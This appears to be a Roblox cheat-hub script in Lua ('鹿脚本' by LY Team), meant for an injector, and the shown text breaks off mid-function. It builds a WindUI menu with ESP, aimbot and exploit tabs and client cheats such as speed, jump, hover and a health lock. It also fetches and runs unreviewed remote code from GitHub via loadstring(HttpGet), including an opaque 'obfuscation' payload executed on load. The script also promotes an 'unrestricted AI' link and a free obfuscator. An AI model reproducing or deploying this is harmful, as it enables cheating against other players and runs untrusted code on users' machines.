local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local CONFIGS = {
    ["kjkalt"] = {
        Text = "LY Team Owner"
    },
    ["godwhy532"] = {
        Text = "LY Team Owner"
    }
}

local BLUE = Color3.fromRGB(40, 160, 255)
local WHITE = Color3.fromRGB(255, 255, 255)

local function toHex(color)
    return string.format("%02x%02x%02x",
        math.floor(color.R * 255),
        math.floor(color.G * 255),
        math.floor(color.B * 255)
    )
end

local function createDevourText(text, offset)
    local len = #text
    local result = {}
    for i = 1, len do
        local char = text:sub(i,i)
        local pos = (i-1)/(len-1)
        local blend = math.clamp((pos - offset)/0.32, 0, 1)
        local charColor = BLUE:Lerp(WHITE, blend)
        table.insert(result, string.format('<font color="#%s">%s</font>', toHex(charColor), char))
    end
    return table.concat(result)
end

local function setupPlayer(player)
    if not player or player.Parent ~= Players then return end
    local config = CONFIGS[player.Name]
    if not config then return end

    local function addTag()
        task.spawn(function()
            local character = player.Character
            if not character then
                local success, _ = pcall(function()
                    character = player.CharacterAdded:Wait(10)
                end)
                if not success or not character then return end
            end

            local head = character:WaitForChild("Head", 5)
            if not head then return end

            local old = head:FindFirstChild("LYTeamTag")
            if old then old:Destroy() end

            local billboard = Instance.new("BillboardGui")
            billboard.Name = "LYTeamTag"
            billboard.Size = UDim2.new(0, 320, 0, 80)
            billboard.StudsOffset = Vector3.new(0, 2.7, 0)
            billboard.AlwaysOnTop = true
            billboard.MaxDistance = 120
            billboard.ClipsDescendants = false

            local background = Instance.new("Frame")
            background.Name = "Background"
            background.Size = UDim2.new(1, 0, 1, 0)
            background.Position = UDim2.new(0.5, 0, 0.5, 0)
            background.AnchorPoint = Vector2.new(0.5,0.5)
            background.BackgroundColor3 = BLUE
            background.BackgroundTransparency = 0.4
            background.Parent = billboard

            local backgroundCorner = Instance.new("UICorner")
            backgroundCorner.CornerRadius = UDim.new(0.4,0)
            backgroundCorner.Parent = background

            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1,0,1,0)
            label.Position = UDim2.new(0.5,0,0.5,0)
            label.AnchorPoint = Vector2.new(0.5,0.5)
            label.BackgroundTransparency = 1
            label.RichText = true
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.TextStrokeColor3 = Color3.new(0,0,0)
            label.TextStrokeTransparency = 0.4
            label.Parent = billboard

            local stroke = Instance.new("UIStroke")
            stroke.Thickness = 3
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = background

            local devourOffset = 0
            local breathePhase = 0
            local isResetting = false
            local conn

            conn = RunService.Heartbeat:Connect(function(dt)
                if not label or not label.Parent or not background or not background.Parent then
                    if conn then conn:Disconnect() end
                    return
                end

                
                if not isResetting then
                    devourOffset += dt * 0.75
                    if devourOffset >= 1 then
                        isResetting = true
                    end
                else
                    
                    devourOffset -= dt * 0.45
                    if devourOffset <= 0 then
                        devourOffset = 0
                        isResetting = false
                    end
                end

                label.Text = createDevourText(config.Text, devourOffset)
                background.BackgroundColor3 = BLUE:Lerp(WHITE, devourOffset)
                background.BackgroundTransparency = 0.4 - devourOffset * 0.15

                
                breathePhase += dt * 0.9
                local breathT = (math.sin(breathePhase)+1)/2
                stroke.Color = BLUE:Lerp(WHITE, breathT)
                stroke.Thickness = 3.2 + breathT * 1.6
                stroke.Transparency = 0.3 - breathT * 0.1
            end)

            billboard.Parent = head
        end)
    end

    if player.Character then
        addTag()
    end
    player.CharacterAdded:Connect(addTag)
end

for _, ply in ipairs(Players:GetPlayers()) do
    setupPlayer(ply)
end
Players.PlayerAdded:Connect(setupPlayer)

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "WelcomeTextUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = lp.PlayerGui

local textFrame = Instance.new("Frame")
textFrame.Size = UDim2.new(0, 320, 0, 60)
textFrame.Position = UDim2.new(0.82, 0, 0.08, 0)
textFrame.BackgroundTransparency = 1
textFrame.Parent = gui

local welcomeText = Instance.new("TextLabel")
welcomeText.Size = UDim2.new(1,0,0.5,0)
welcomeText.BackgroundTransparency = 1
welcomeText.Text = "欢迎鹿脚本用户"
welcomeText.Font = Enum.Font.GothamBold
welcomeText.TextSize = 24
welcomeText.Parent = textFrame

local timeText = Instance.new("TextLabel")
timeText.Size = UDim2.new(1,0,0.5,0)
timeText.Position = UDim2.new(0,0,0.5,0)
timeText.BackgroundTransparency = 1
timeText.TextSize = 20
timeText.Font = Enum.Font.Gotham
timeText.Parent = textFrame

task.spawn(function()
    local hue = 0
    local fade = 0
    local add = 0.02
    while task.wait(0.03) do
        hue += 0.008
        if hue >= 1 then hue = 0 end
        fade += add
        if fade >= 1 or fade <= 0 then
            add = -add
        end
        local rainbowColor = Color3.fromHSV(hue,1,1)
        welcomeText.TextColor3 = rainbowColor
        timeText.TextColor3 = rainbowColor
        welcomeText.TextTransparency = fade
        timeText.TextTransparency = fade
        local currentTime = os.date("%H:%M:%S")
        timeText.Text = "当前时间："..currentTime
    end
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/obfuscation/refs/heads/main/you%20loadstring"))()
local WindUI = loadstring(game:HttpGet("https://github.com/lolssqa/rspy-but-back/releases/download/now/main.lua"))()
local FLOW_SPEED = 5.5
local BORDER_THICKNESS = 1.7
local FIXED_FONT = Enum.Font.SourceSansBold
local WhiteFlowTheme = ColorSequence.new({
	ColorSequenceKeypoint.new(0.00, Color3.fromHex("D6F0FF")),
	ColorSequenceKeypoint.new(0.25, Color3.fromHex("7FD1FF")),
	ColorSequenceKeypoint.new(0.45, Color3.fromHex("1E90FF")),
	ColorSequenceKeypoint.new(0.55, Color3.fromHex("FFFFFF")),
	ColorSequenceKeypoint.new(0.75, Color3.fromHex("58B6FF")),
	ColorSequenceKeypoint.new(1.00, Color3.fromHex("B8E7FF")),
})
local borderAnimation
local borderInitialized = false

function gradient(text, startColor, endColor)
    local result = ""
    local chars = {}
    for uchar in text:gmatch("[%z\1-\127\194-\244][\128-\191]*") do
        table.insert(chars, uchar)
    end
    local length = #chars
    for i = 1, length do
        local t = (i - 1) / math.max(length - 1, 1)
        local r = startColor.R + (endColor.R - startColor.R) * t
        local g = startColor.G + (endColor.G - startColor.G) * t
        local b = startColor.B + (endColor.B - startColor.B) * t
        result = result .. string.format('<font color="rgb(%d,%d,%d)">%s</font>', 
            math.floor(r * 255), math.floor(g * 255), math.floor(b * 255), chars[i])
    end
    return result
end

local function StartFontEnforcer()
    if not Window or not Window.UIElements then 
        task.wait(1)
        if not Window or not Window.UIElements then return end
    end  
    local MainFrame = Window.UIElements.Main
    local function setFont(instance)
        if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
            pcall(function() 
                instance.Font = FIXED_FONT 
                instance.RichText = true
            end)
        end
    end
    for _, child in ipairs(MainFrame:GetDescendants()) do
        setFont(child)
    end
    MainFrame.DescendantAdded:Connect(function(child)
        setFont(child)
    end)
end
local function createBorder(window)
    if not window or not window.UIElements then
        task.wait(1)
        if not window or not window.UIElements then return nil end
    end
    local mainFrame = window.UIElements.Main
    if not mainFrame then return nil end    
    if mainFrame:FindFirstChild("FlowBorder") then return mainFrame.FlowBorder end    
    if not mainFrame:FindFirstChildOfClass("UICorner") then
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 16)
        corner.Parent = mainFrame
    end    
    local stroke = Instance.new("UIStroke")
    stroke.Name = "FlowBorder"
    stroke.Thickness = BORDER_THICKNESS
    stroke.Color = Color3.new(1, 1, 1)
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.LineJoinMode = Enum.LineJoinMode.Round
    stroke.Enabled = true
    stroke.Parent = mainFrame    
    local gradient = Instance.new("UIGradient")
    gradient.Name = "StreamEffect"
    gradient.Color = WhiteFlowTheme
    gradient.Rotation = 0
    gradient.Parent = stroke    
    return stroke
end
local function startBorderAnimation(window)
    if not window or not window.UIElements then return nil end
    local mainFrame = window.UIElements.Main
    if not mainFrame then return nil end    
    local stroke = mainFrame:FindFirstChild("FlowBorder")
    if not stroke then return nil end    
    local gradient = stroke:FindFirstChild("StreamEffect")
    if not gradient then return nil end    
    if borderAnimation then borderAnimation:Disconnect() borderAnimation = nil end    
    local animation
    animation = game:GetService("RunService").Heartbeat:Connect(function()
        if not stroke or stroke.Parent == nil then
            animation:Disconnect()
            return
        end
        gradient.Rotation = (tick() * FLOW_SPEED * 20) % 360
    end)
    borderAnimation = animation
    return animation
end

Window = WindUI:CreateWindow({
    Title = gradient("鹿脚本｜v1通用版", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), 
    Author = gradient("作者:LY Team", Color3.fromHex("#00FFAA"), Color3.fromHex("#00AAFF")),
    IconThemed = true,
    Folder = "LY_TEAM",
   Transparent = true,
    Theme = "Dark",
    SideBarWidth = 120,
    HideSearchBar = false,
    ScrollBarEnabled = true,
    Background = "rbxassetid://109195003073445",
    BackgroundImageTransparency = 0.2,
--    Background = "https://raw.githubusercontent.com/lolssqa/special-octo-broccoli/b19060dddfb0e4df6c7d43a9a8d5a693d30c01f4/share_1791337524827.jpeg",
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function()
        end
    },
})
task.spawn(function()
    local offset = 0
    while task.wait(0.05) do
        offset += 0.04
        if offset >= 1 then
            offset = 0
        end

        local color1 = Color3.new(0.12, 0.62, 1)
        local color2 = Color3.new(1, 1, 1)
        local color3 = Color3.new(0.35, 0.78, 1)

        local seq = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, color1:Lerp(color2, (math.sin(offset * math.pi * 2 + 0) + 1) / 2)),
            ColorSequenceKeypoint.new(0.50, color2),
            ColorSequenceKeypoint.new(1.00, color1:Lerp(color3, (math.sin(offset * math.pi * 2 + math.pi) + 1) / 2)),
        })

        Window:EditOpenButton({
            Title = "67 鹿脚本 67｜LU_HUB_2026",
            Icon = "github",
            CornerRadius = UDim.new(1, 0),
            StrokeThickness = 3,
            Enabled = true,
            Draggable = true,
            OnlyMobile = false,
            Scale = 1,
            Color = seq,
        })
    end
end)


local timeTag = Window:Tag({
    Title = "LU_HUB完美版",
    Icon = "crown", 
    Radius = 20,
    Color = Color3.new(0, 1, 0), 
    TextColor = Color3.new(1,1,1) 
})

local FPSTag = Window:Tag({
    Title = "FPS: 0",
    Color = Color3.fromRGB(100, 150, 255),
})
 
local RunService = game:GetService("RunService")
local lastUpdate = tick()
local frameCount = 0
 
RunService.RenderStepped:Connect(function()
    frameCount = frameCount + 1
    local now = tick()
    
    if now - lastUpdate >= 1 then
        local fps = math.floor(frameCount / (now - lastUpdate))
        FPSTag:SetTitle("FPS: " .. fps)
        
        if fps >= 50 then
            FPSTag:SetColor(Color3.fromRGB(0, 255, 0)) -- Green
        elseif fps >= 30 then
            FPSTag:SetColor(Color3.fromRGB(255, 200, 0)) -- Yellow
        else
            FPSTag:SetColor(Color3.fromRGB(255, 0, 0)) -- Red
        end
        
        
        frameCount = 0
        lastUpdate = now
    end
end)

local PingTag = Window:Tag({
    Title = "Ping: 0ms",
    Color = Color3.fromRGB(100, 200, 255),
})
 
task.spawn(function()
    while true do
        local success, ping = pcall(function()
            local Stats = game:GetService("Stats")
            local pingValue = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
            return math.floor(pingValue)
        end)
        
        if success and ping then
            PingTag:SetTitle("Ping: " .. ping .. "ms")
            
            if ping <= 50 then
                PingTag:SetColor(Color3.fromRGB(0, 255, 0)) -- Green
            elseif ping <= 100 then
                PingTag:SetColor(Color3.fromRGB(255, 200, 0)) -- Yellow
            elseif ping <= 200 then
                PingTag:SetColor(Color3.fromRGB(255, 150, 0)) -- Orange
            else
                PingTag:SetColor(Color3.fromRGB(255, 0, 0)) -- Red
            end
        end
        
        task.wait(2)
    end
end)
task.spawn(function()
    task.wait(0.05)
    for _,v in timeTag:GetDescendants() do
        if v:IsA("TextLabel") then
            v.TextColor3 = Color3.new(0,0,0)
        end
    end
end)

Window:SetToggleKey(Enum.KeyCode.F, true)

if not borderInitialized then
    task.spawn(function()
        task.wait(0.5) 
        local stroke = createBorder(Window)
        if stroke then
            startBorderAnimation(Window)
            borderInitialized = true
        end
        
        StartFontEnforcer()
    end)
end

local originalOpenFunction = Window.Open
Window.Open = function(...)
    local result = originalOpenFunction(...)
    if borderInitialized and not borderAnimation then
        task.wait(0.1)
        startBorderAnimation(Window)
    end
    return result
end

Window:OnClose(function()
    if borderAnimation then
        borderAnimation:Disconnect()
        borderAnimation = nil
    end
end)
getgenv().InfoGroup = Window:Section({
    Title = "信息 & 设置",
    Collapsed = true
})

getgenv().PlayerGroup = Window:Section({
    Title = "玩家修改",
    Collapsed = true
})

getgenv().GeneralGroup = Window:Section({
    Title = "通用工具",
    Collapsed = true
})

getgenv().MovementGroup = Window:Section({
    Title = "移动功能",
    Collapsed = true
})

getgenv().EspGroup = Window:Section({
    Title = "透视功能",
    Collapsed = true
})

getgenv().AimRangeGroup = Window:Section({
    Title = "自瞄 & 范围",
    Collapsed = true
})

getgenv().ExploitGroup = Window:Section({
    Title = "漏洞 & 互动",    
    Collapsed = true
})

getgenv().FunGroup = Window:Section({
    Title = "娱乐脚本",
    Collapsed = true
})

getgenv().GyroGroup = Window:Section({
    Title = "陀螺仪功能",
    Collapsed = true
})

getgenv().VisualGroup = Window:Section({
    Title = "视觉美化&伪装",
    Collapsed = true
})

getgenv().Tabs = {
    GodWhy = getgenv().InfoGroup:Tab({ Title = gradient("公告", Color3.fromHex("#D6F0FF"), Color3.fromHex("#FFFFFF")), Icon = "megaphone"}),
    Info = getgenv().InfoGroup:Tab({ Title = gradient("Info", Color3.fromHex("#D6F0FF"), Color3.fromHex("#FFFFFF")), Icon = "info"}),
    Settings = getgenv().InfoGroup:Tab({ Title = gradient("settings", Color3.fromHex("#D6F0FF"), Color3.fromHex("#FFFFFF")), Icon = "cog"}),
    ServerTab = getgenv().InfoGroup:Tab({ Title = gradient("目前支持服务器", Color3.fromHex("#ff0000"), Color3.fromHex("#00ffff")), Icon = "server"}),

    y = getgenv().PlayerGroup:Tab({ Title = gradient("玩家修改", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "user"}),
    BodyScaleTab = getgenv().PlayerGroup:Tab({ Title = gradient("身体大小调整", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "ruler"}),

    NewTab = getgenv().GeneralGroup:Tab({ Title = gradient("通用", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "settings"}),
    NewTab2 = getgenv().GeneralGroup:Tab({ Title = gradient("通用2", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "sliders-horizontal"}),
    DevToolsTab = getgenv().GeneralGroup:Tab({ Title = gradient("开发者工具区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "code"}),

    TeleportFlyTab = getgenv().MovementGroup:Tab({ Title = gradient("传送与甩飞区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "move"}),
    VehicleFlyTab = getgenv().MovementGroup:Tab({ Title = gradient("飞车与飞行区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "car"}),

    XrayTab = getgenv().EspGroup:Tab({ Title = gradient("透视专区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "eye"}),
    NpcEspTab = getgenv().EspGroup:Tab({ Title = gradient("NPC透视区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "scan-eye"}),

    AimTab = getgenv().AimRangeGroup:Tab({ Title = gradient("自瞄区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "crosshair"}),
    NpcAimTab = getgenv().AimRangeGroup:Tab({ Title = gradient("NPC自瞄区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "target"}),
    NpcRangeTab = getgenv().AimRangeGroup:Tab({ Title = gradient("NPC范围区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "radius"}),
    PlayerRangeTab = getgenv().AimRangeGroup:Tab({ Title = gradient("玩家范围区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "users"}),
    PlayerOrbitTab = getgenv().AimRangeGroup:Tab({ Title = gradient("玩家环绕区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "rotate-cw"}),

    BlackHoleTab = getgenv().ExploitGroup:Tab({ Title = gradient("黑洞区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "circle-dot"}),
    ExploitTab = getgenv().ExploitGroup:Tab({ Title = gradient("漏洞利用区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "bug"}),
    F3xTab = getgenv().ExploitGroup:Tab({ Title = gradient("F3X利用区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "hammer"}),
    InteractTab = getgenv().ExploitGroup:Tab({ Title = gradient("互动区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "hand"}),
    ObjectCtrlTab = getgenv().ExploitGroup:Tab({ Title = gradient("物体控制区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "box"}),

    Fun = getgenv().FunGroup:Tab({ Title = gradient("特殊脚本", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "sparkles"}),
    danceTab = getgenv().FunGroup:Tab({ Title = gradient("跳舞区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "sparkles"}),
    Music = getgenv().FunGroup:Tab({ Title = gradient("音乐区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "music"}),
    FeZone = getgenv().FunGroup:Tab({ Title = gradient("FE区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "shield"}),

    
    GyroTab = getgenv().GyroGroup:Tab({ Title = gradient("陀螺仪设置", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "smartphone"}),

    LightTab = getgenv().VisualGroup:Tab({ Title = gradient("光影区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "sun"}),
    NinjaTab = getgenv().VisualGroup:Tab({ Title = gradient("美化区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "palette"}),
    HaloTab = getgenv().VisualGroup:Tab({ Title = gradient("光环区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "star"}),
    WebhookTab = getgenv().VisualGroup:Tab({ Title = gradient("Webhook区", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "link"}),
   FakeTab = getgenv().VisualGroup:Tab({ Title = gradient("玩家伪装", Color3.fromHex("#00FFAA"), Color3.fromHex("#00FFFF")), Icon = "search"}),
}
WindUI:Notify({
    Title = "鹿脚本",
    Content = "鹿脚本加载成功 作者 LY Team 当前时间：" .. os.date("%H:%M:%S"),
    Icon = "rbxassetid://115187273703029",  
    Duration = 4
})

Tabs.Info:Section({Title = "节日公告"})

Tabs.Info:Paragraph({
    Title = "节日提示",
    Desc = "🎉国庆节快乐！万事顺遂",
})

Tabs.Info:Section({Title = "脚本信息"})

Tabs.Info:Paragraph({
    Title = "公告:",
    Desc = "该脚本由LY Team制作，目前版本v0.0.1，免费版 尊敬的用户欢迎使用鹿脚本脚本在持续更新加入qq群1032019653",
    Image = "https://play-lh.googleusercontent.com/7cIIPlWm4m7AGqVpEsIfyL-HW4cQla4ucXnfalMft1TMIYQIlf2vqgmthlZgbNAQoaQ",
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Section({Title = "脚本信息"})
Tabs.Info:Paragraph({
    Title = "公告:",
    Desc = "该脚由LY Team制作，目前版本v0.0.1，免费版 尊敬的用户欢迎使用鹿脚本脚本在持续更新加入qq群1032019653",
    Image = "https://play-lh.googleusercontent.com/7cIIPlWm4m7AGqVpEsIfyL-HW4cQla4ucXnfalMft1TMIYQIlf2vqgmthlZgbNAQoaQ",
    ImageSize = 20,
    ThumbnailSize = 120
})

Tabs.Info:Section({Title = "脚本信息"})
Tabs.Info:Paragraph({
    Title = "公告:",
    Desc = "脚本帮助者KXG。制作者鹿言。qq群972232322。吉祥物唐人。神秘人 喵哉",
    Image = "https://play-lh.googleusercontent.com/7cIIPlWm4m7AGqVpEsIfyL-HW4cQla4ucXnfalMft1TMIYQIlf2vqgmthlZgbNAQoaQ",
    ImageSize = 20,
    ThumbnailSize = 120
})

local createTimeUnix = 1785749160 --2026‑08‑03 09:26:00
local oneYearAnniUnix = 1817285160 --2027‑08‑03 09:26:00
local nowUnix = os.time()

local daysPassed = math.floor((nowUnix - createTimeUnix) / 86400)
local daysToAnni = math.ceil((oneYearAnniUnix - nowUnix) / 86400)

Tabs.Info:Paragraph({
    Title = "脚本诞生时间:",
    Desc = "2026‑08‑03 09:26",
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "已运行天数:",
    Desc = tostring(daysPassed),
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "距离一周年:",
    Desc = daysToAnni.." 天",
    ImageSize = 20,
    ThumbnailSize = 120
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ClientId = game:GetService("HttpService"):GenerateGUID(false)
local ServerId = game.JobId
local AccountDays = math.floor(LocalPlayer.AccountAge)
local AccountYear = tonumber(string.format("%.2f", AccountDays/365))

Tabs.Info:Paragraph({
    Title = "用户名:",
    Desc = LocalPlayer.Name,
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "用户ID:",
    Desc = tostring(LocalPlayer.UserId),
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "客户端ID:",
    Desc = ClientId,
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "地区:",
    Desc = "TW",
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "语言:",
    Desc = "zh-cn",
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "账户年龄(天):",
    Desc = tostring(AccountDays),
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "账户年龄(年):",
    Desc = tostring(AccountYear),
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "注入器:",
    Desc = "Delta",
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "服务器ID:",
    Desc = ServerId,
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "服务器位置ID:",
    Desc = "97152974415088",
    ImageSize = 20,
    ThumbnailSize = 120
})
Tabs.Info:Paragraph({
    Title = "服务器在线人数:",
    Desc = tostring(#Players:GetPlayers()),
    ImageSize = 20,
    ThumbnailSize = 120
})

Tabs.GodWhy:Paragraph({
    Title = "欢迎使用鹿脚本",
    Desc = "由鹿言和kxg制作",
    Image = "info",
    ImageSize = 24,
    Thumbnail = "rbxassetid://78698596309475",
    ThumbnailSize = 64,
    Color = Color3.fromRGB(100, 200, 255),
    Buttons = {
        {
            Title = "对",
            Icon = "check",
            Callback = function()
                print("Action clicked")
            end
        }
    }
})

Tabs.GodWhy:Paragraph({
    Title = "制作人名单",
    Desc = "创始人鹿言 kxg 支持者 喵哉 唐人",
    Image = "info",
    ImageSize = 24,
    Thumbnail = "rbxassetid://115187273703029",
    ThumbnailSize = 64,
    Color = Color3.fromRGB(64, 224, 208), 
    Buttons = {
        {
            Title = "对",
            Icon = "check",
            Callback = function()
                print("Action clicked")
            end
        }
    }
})

Tabs.GodWhy:Paragraph({
    Title = "欢迎使用鹿脚本",
    Desc = "由鹿言和kxg制作",
    Image = "info",
    ImageSize = 24,
    Thumbnail = "rbxassetid://84687710181215",
    ThumbnailSize = 64,
    Color = Color3.fromRGB(100, 200, 255),
    Buttons = {
        {
            Title = "复制快手",
            Icon = "check",
            Callback = function()
                setclipboard("4943010008")
            end
        },
        {
            Title = "复制QQ群",
            Icon = "copy",
            Callback = function()
                setclipboard("972232322")
            end
        }
    }
})

Tabs.GodWhy:Paragraph({
    Title = "免费混淆",
    Desc = "无限制机器人",
    Image = "info",
    ImageSize = 24,
    Thumbnail = "rbxassetid://84687710181215",
    ThumbnailSize = 64,
    Color = Color3.fromRGB(100, 200, 255),
    Buttons = {
        {
            Title = "复制无限制ai",
            Icon = "check",
            Callback = function()
                setclipboard("https://chat.dphn.ai/")
            end
        },
        {
            Title = "复制免费混淆",
            Icon = "copy",
            Callback = function()
                setclipboard("https://goofyscator.lua.cz/")
            end
        }
    }
})

local hyw = Tabs.y:Section({
    Title = "ee",
--    Icon = "bird",
})
hyw:Button({
    Title = "py",
    Callback = function() 
  -- Hope you will enjoy using it ;)
loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()  
    end
})
Tabs.y:Toggle({
    Title = "功能",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
    end,
})
Tabs.y:Divider()
Tabs.y:Input({
    Title = "滚木",
    Value = "Guest",
    Placeholder = "面🍜",
    Callback = function(input)
 
     end
})
local LocalPlayer = game:GetService("Players").LocalPlayer
local RunService = game:GetService("RunService")
local jumpValue = 50
local jumpLoop = nil

Tabs.y:Toggle({
	Title = "开启自定义跳跃",
	Default = false,
	Callback = function(state)
		if state then
			jumpLoop = RunService.Heartbeat:Connect(function()
				local char = LocalPlayer.Character
				if not char then return end
				local hum = char:FindFirstChildOfClass("Humanoid")
				if not hum then return end
				hum.UseJumpPower = true
				hum.JumpPower = jumpValue
			end)
		else
			if jumpLoop then
				jumpLoop:Disconnect()
				jumpLoop = nil
				local char = LocalPlayer.Character
				if char then
					local hum = char:FindFirstChildOfClass("Humanoid")
					if hum then
						hum.JumpPower = 50
					end
				end
			end
		end
	end
})

Tabs.y:Slider({
    Title = "自身跳跃力度",
    Step = 1,
    Value = {Min = 50, Max = 220, Default = 50},
    Callback = function(value)
        jumpValue = value
    end
})
local LocalPlayer = game:GetService("Players").LocalPlayer
Tabs.y:Slider({
    Title = "自身移速",
    Step = 1,
    Value = {Min = 16, Max = 200, Default = 16},
    Callback = function(value)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = value
        end
    end
})
local forceObj
Tabs.y:Slider({
    Title = "角色重力缩放",
    Step = 0.05,
    Value = {Min = 0, Max = 3, Default = 1},
    Callback = function(value)
        local LocalPlayer = game:GetService("Players").LocalPlayer
        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        
        if not forceObj or not forceObj:IsDescendantOf(hrp) then
            forceObj = Instance.new("VectorForce")
            forceObj.Name = "GravitySim"
            forceObj.Attachment0 = hrp:WaitForChild("RootAttachment")
            forceObj.Parent = hrp
        end
        local baseGrav = workspace.Gravity * hrp.AssemblyMass
        forceObj.Force = Vector3.new(0, baseGrav * (value - 1), 0)
    end
})
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local hoverConn = nil
local targetHeight = 30
local lp = Players.LocalPlayer

Tabs.y:Slider({
    Title = "悬浮高度调节",
    Step = 0.5,
    Value = {Min = 0, Max = 200, Default = 30},
    Callback = function(val)
        targetHeight = val
    end
})

Tabs.y:Toggle({
    Title = "启用锁定悬浮",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            hoverConn = RunService.Heartbeat:Connect(function()
                local char = lp.Character
                if not char then return end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.Position = Vector3.new(hrp.Position.X, targetHeight, hrp.Position.Z)
                end
            end)
        else
            if hoverConn then
                hoverConn:Disconnect()
                hoverConn = nil
            end
        end
    end
})
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local healthLoop

Tabs.y:Slider({
    Title = "自身血量设置",
    Step = 10,
    Value = {Min = 10, Max = 1000, Default = 100},
    Callback = function(value)
        _G.SetHealthValue = value
    end
})

Tabs.y:Toggle({
    Title = "强制锁定自身血量",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            healthLoop = game:GetService("RunService").Heartbeat:Connect(function()
                local char = LocalPlayer.Character
                if not char then return end
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then
                    hum.MaxHealth = _G.SetHealthValue
                    hum.Health = _G.SetHealthValue
                end
            end)
        else
            if healthLoop then
                healthLoop:Disconnect()
                healthLoop = nil
            end
        end
    end
})
local RunService = game:GetService("RunService")
local camLoop

Tabs.y:Slider({
    Title = "相机广角(视野FOV)",
    Step = 1,
    Value = {Min = 20, Max = 120, Default = 70},
    Callback = function(val)
        _G.TargetFOV = val
    end
})

Tabs.y:Toggle({
    Title = "启用自定义广角",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            camLoop = RunService.RenderStepped:Connect(function()
                local cam = workspace.CurrentCamera
                if cam then
                    cam.FieldOfView = _G.TargetFOV
                end
            end)
        else
            if camLoop then
                camLoop:Disconnect()
                camLoop = nil
            end
            workspace.CurrentCamera.FieldOfView = 70
        end
    end
})
local RunService = game:GetService("RunService")
local fullBrightConn

Tabs.y:Toggle({
    Title = "FullBright全局高亮",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local Lighting = game:GetService("Lighting")
        if enabled then
